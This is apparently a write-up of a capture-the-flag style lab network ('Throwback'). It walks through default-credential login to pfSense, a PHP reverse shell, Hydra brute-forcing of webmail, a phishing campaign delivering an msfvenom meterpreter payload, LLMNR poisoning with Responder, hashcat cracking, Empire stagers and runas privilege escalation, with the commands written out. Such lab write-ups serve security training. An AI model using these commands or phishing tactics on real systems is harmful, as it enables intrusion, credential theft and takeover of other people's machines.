# Enumeration
---

The initial network scope looks like this:
![image of initial network map](/assets/img/posts/throwback/network_layout.webp)

Using nmap for initial enumeration, I discovered 3 of the in-scope machines and their open ports, as well as the name of the domain that they're apart of.

**Command**
```shell
nmap -sV -sC -p- -v 10.200.29.0/24 --min-rate 5000
```

## Throwback FW01
---
Going to the firewall's web interface, it confirmed that it is running **pfsense**, which has an administrator login.

![pfsense login page](/assets/img/posts/throwback/1_pfsense_login_page.webp)

### Logging In

However, the default credentials were never changed and therefore, I was able to simply login to the panel using the  default credentials `admin:pfsense`.

![logged in to pfsense panel](/assets/img/posts/throwback/2_pfsense_admin.webp)

### Reverse Shell

Then, after poking around what the panel has to offer, I found a diagnostics page (under Diagonistics > Command Prompt), which conveniently allowed for code execution in both bash shell and PHP form, as well as file upload and download. So naturally, I executed [this](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) PHP reverse shell in the interface, opened a listener on my machine, and got root access to THROWBACK-FW01. That was easy.

![php reverse shell in diagnostics tab](/assets/img/posts/throwback/3_pfsense_phprs.webp)

![reverse shell from my machine](/assets/img/posts/throwback/4_pfsense_root.webp)

### FW01 Flags

Using the following command, I was able to find search for .txt files on the machine to find the flags.

```shell
find / -iname "*.txt" 2>&1
```

This way, I found flags 3 and 4.

![flags 3 and 4](/assets/img/posts/throwback/5_fw01_flags.webp)

### Credentials

Also in `/var/logs/` I found the unusual log `login.log`, which contained encrypted credentials to a user **HumphreyW**.

![humphreyws credentials in login.log](/assets/img/posts/throwback/6_humphreyw_creds.webp)

His password was easily cracked using [Crackstation](https://crackstation.net/):

![humphreyws cracked password](/assets/img/posts/throwback/7_humphrey_cracked.webp)

## Throwback MAIL
---

### Logging in

This is the mail server, which also has a web interface and login page. The guest credentials to login `tbhguest:WelcomeTBH1!` were hardcoded just above the form.

![mail interface guest credentials](/assets/img/posts/throwback/8_mail_login.webp)

### MAIL Flags

I found the first flag in the **Welcome** email in the inbox:

![first flag](/assets/img/posts/throwback/9_flag1.webp)

And the second flag in the address book:

![second flag](/assets/img/posts/throwback/10_flag2.webp)

The address book also more importantly contained a list of employee names and emails, which I compiled into seperate documents to use later on.

![list of usernames and emails](/assets/img/posts/throwback/11_emails_and_usernames.webp)

### Brute-forcing

I decided to use the username list and along with a small list of commonly used passwords to bruteforce the employee credentials.

![lists of usernames and passwords](/assets/img/posts/throwback/12_users_pass_lists.webp)

First, I captured the login request to the server using a web proxy and **BurpSuite**, to take note of the field identifiers to use in **Hydra**.

![burpsuite login request](/assets/img/posts/throwback/13_burp_request.webp)

Then, I used this Hydra command:
```shell
hydra -L mail_users.txt -P mail_pass.txt 10.200.29.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=Unknown user or password incorrect.' -I
```

And successfully found these users' passwords:
![hydra found passwords](/assets/img/posts/throwback/14_hydra_found.webp)

### Phishing
---
At this point however, I needed a way to move to another machine on the network. And the next target was WS01, an employee workstation.

To get access to a workstation, I chose to launch a phishing campaign against the employee email list, posing as IT support, telling employee's to update the note-taking software they're using, which would actually be a reverse shell pointing back to me.

I used the following MSFVenom command to generate a reverse shell exe:
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe -o shell.exe
```

And the following email as the vehicle:
![phishing email](/assets/img/posts/throwback/15_phishing_email.webp)

Setup a handler using msfconsole:
![msfconsole handler](/assets/img/posts/throwback/16_handler.webp)

And got a meterpreter shell as the user **BlaireJ** on their workstation:
![meterpreter shell](/assets/img/posts/throwback/17_meterpreter_shell.webp)


### Flags 1 & 2

From here, I found the 2 flags for the machine with ease. The first being on BlaireJ's desktop:
![flag 5](/assets/img/posts/throwback/18_flag5.webp)

And the second on HumphreyW's desktop:
![flag 6](/assets/img/posts/throwback/19_flag6.webp)

### LLMNR Poisoning

Then, with the shell open, I used this responder command:

```shell
sudo responder -I tun0 -dw -v
```

To spoof the destination of LLMNR requests on the network, and recieve **PetersJ**'s NTMLv2 hash, which was intended for BlaireJ.

![llmnr poisoning](/assets/img/posts/throwback/20_poison.webp)

This hash would take a very long time to crack on my laptop, so I used [Penglab](https://github.com/mxrch/penglab) to use a much faster machine with a GPU via Google Collab.

On Penglab, I used this hashcat command (with [this](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule) rule):
```shell
hashcat -m 5600 -r OneRuleToRuleThemAll.rule --force petersj.hash.txt /content/wordlists/rockyou.txt
```

And successfully cracked PetersJ's password `Throwback317`:
![petersjs password cracked](/assets/img/posts/throwback/21_petersj_cracked.webp)

## THROWBACK-PROD

### Post Exploitation Framework

Post exploitation, I used the [Empire](https://github.com/EmpireProject/Empire) framework as well as [Starkiller](https://github.com/BC-SECURITY/Starkiller), a front-end for it.

Very easily setup and ran with:
```shell
sudo ./ps-empire server
sudo ./starkiller-1.12.0.AppImage --no-sandbox
```

![empire and starkiller setup](/assets/img/posts/throwback/22_empire_starkiller.webp)

And that opened access to the Starkiller panel running on localhost:
![starkiller](/assets/img/posts/throwback/23_starkiller_interface.webp)

To begin further exploitation, I needed to setup a listener and a stager for PetersJ to run, to use the account as an agent.

To do this I firstly created a HTTP listener from the listeners tab:

![starkiller listener](/assets/img/posts/throwback/24_starkiller_listener.webp)

Then I made the stager, a Windows batch file to be ran on the compromised workstation:

![starkiller stager](/assets/img/posts/throwback/25_starkiller_stager.webp)

### Enumeration with Seatbelt

With all of that set up, now it was time for some post exploitation enumeration using **Seatbelt** from [Ghostpacks Compiled Binaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries). To use this with Starkiller, I firstly needed to RDP into the machine as PetersJ using this xfreerdp command:

```shell
xfreerdp /u:PetersJ /p:'Throwback317' /v:10.200.29.219
```

![xfreerdp](/assets/img/posts/throwback/26_xfreerdp.webp)

Once I was in, I downloaded both the `launcher.bat` and `seatbelt.exe` files from a webserver on my machine:

![wget seatbelt and launcher](/assets/img/posts/throwback/27_wget.webp)

Then, I ran the stager on WS01 in powershell to load the user as an agent in Starkiller.

![agent](/assets/img/posts/throwback/28_agent.webp)

Now that I had an agent, I executed the `powershell/situational_awareness/host/seatbelt` Empire module to begin enumeration.

![seatbelt empire module](/assets/img/posts/throwback/29_seatbelt_module.webp)

This produced a lot of output, but the main focus is the CredEnum result, showing an admin user by the name of **admin-petersj** has saved credentials on the machine.

![seatbelt output](/assets/img/posts/throwback/30_admin_petersj.webp)

### Privilege Escalation

Using that username , I was able to utilise the `runas` command to use the saved credentials and execute `cmd.exe`, essentially escalating my privileges:
```shell
runas /savecred /user:admin-petersj /profile "cmd.exe"
```
![privesc to admin-petersj](/assets/img/posts/throwback/31_petersj_privesc.webp)

### PROD Flags

From here, I was able to read all three flags on the PROD machine:
![prod flags](/assets/img/posts/throwback/32_prod_flags.webp)
